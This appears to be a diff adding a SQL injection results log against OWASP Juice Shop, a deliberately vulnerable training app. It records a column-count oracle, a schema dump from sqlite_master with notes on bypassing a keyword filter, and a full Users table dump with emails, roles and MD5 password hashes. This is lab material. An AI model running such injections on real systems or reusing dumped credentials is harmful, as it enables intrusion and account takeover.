@@ -1,0 +1,29 @@
+[1] column count = 10 (error oracle)
+{"status":"success","data":[{"id":1,"name":"2","description":"3","price":4,"deluxePrice":5,"image":6,"alternateImages":7,"createdAt":8,"updatedAt":9,"deletedAt":10}]}
+[2] schema disclosure via sqlite_master (note: 'tbl_name' literal is blocked by an app filter, 'name' works)
+{"status":"success","data":[{"id":1,"name":"Users","description":4,"price":5,"deluxePrice":6,"image":7,"alternateImages":8,"createdAt":9,"updatedAt":10,"deletedAt":"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `creat
+[3] full Users table dump (UNION, 10 cols; 'lastLoginIp' name is filtered -> literal 7)
+1 admin@juice-sh.op admin 0192023a7bbd73250516f069df18b500
+2 jim@juice-sh.op customer e541ca7ecf72b8d1286474fc613e5e45
+3 bender@juice-sh.op customer 0c36e517e3fa95aabf1bbffc6744a4ef
+4 bjoern.kimminich@gmail.com admin 6edd9d726cbdc873c539e41ae8757b8c
+5 ciso@juice-sh.op deluxe 861917d5fa5f1172f931dc700d81a8fb
+6 support@juice-sh.op admin 3869433d74e3d0c86fd25562f836bc82
+7 morty@juice-sh.op customer f2f933d0bb0ba057bc8e33b8ebd6d9e8
+8 mc.safesearch@juice-sh.op customer b03f4b0ba8b458fa0acdc02cdb953bc8
+9 J12934@juice-sh.op admin 3c2abc04e4a6ea8f1327d0aae3714b7d
+10 wurstbrot@juice-sh.op admin 9ad5b0492bbe528583e128d2a8941de4
+11 amy@juice-sh.op customer 030f05e45e30710c3ad3c32f00de0473
+12 bjoern@juice-sh.op admin 7f311911af16fa8f418dd1a3051d6810
+13 bjoern@owasp.org deluxe 9283f1b2e9669749081963be0462e466
+14 chris.pike@juice-sh.op customer 10a783b9ed19ea1c67c3a27699f0095b
+15 accountant@juice-sh.op accounting 963e10f92a70b4b463220cb4c5d636dc
+16 uvogin@juice-sh.op customer 05f92148b4b60f7dacd04cceebb8f1af
+17 demo customer fe01ce2a7fbac8fafaed7c982a04e229
+18 john@juice-sh.op customer 00479e957b6b42c459ee5746478e4d45
+19 emma@juice-sh.op customer 402f1c4a75e316afec5a6ea63147f739
+20 stan@juice-sh.op deluxe e9048a3f43dd5e094ef733f3bd88ea64
+21 ethereum@juice-sh.op deluxe 2c17c6393771ee3048ae34d6b380c5ec
+22 testing@juice-sh.op admin b616a64605a07941fbd31868aea3b54b
+23 cloud-admin@juice-sh.op admin 127af90bb4cd56817d123db3788ab502
+24 basil@juice-sh.op customer 1d75226504523f04d2b239a7fb2990fd
